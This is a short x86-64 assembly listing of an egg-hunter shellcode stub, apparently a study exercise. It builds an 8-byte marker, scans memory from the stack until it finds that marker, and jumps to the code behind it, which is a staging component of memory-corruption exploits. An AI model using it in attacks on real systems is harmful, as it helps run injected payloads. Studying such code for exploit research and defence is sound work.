global _start

section .text

_start:

	push rsp ; push the stack address in the stack
	mov ebx,0xfcfdfcfd ; move the high 4 bytes of the EGG in ebx
	mov eax,ebx ; eax = EGG
	shl rax,32 ; rax = 0xfcfdfcfd00000000
	add rax,rbx ; rax = 0xfcfdfcfdfcfdfcfd
	xor rcx,rcx ; clear rcx
	pop rcx ; load the stack address in rcx
loop:	
	inc rcx ; increase rcx 
	push rcx ; push rcx in the stack
	pop rdi ; load it in rdi
	scasq ; compare the memory pointed to scasq with rax
	jnz loop ; jump if not equal
	jmp rdi ; "EGGEGG" found jump 

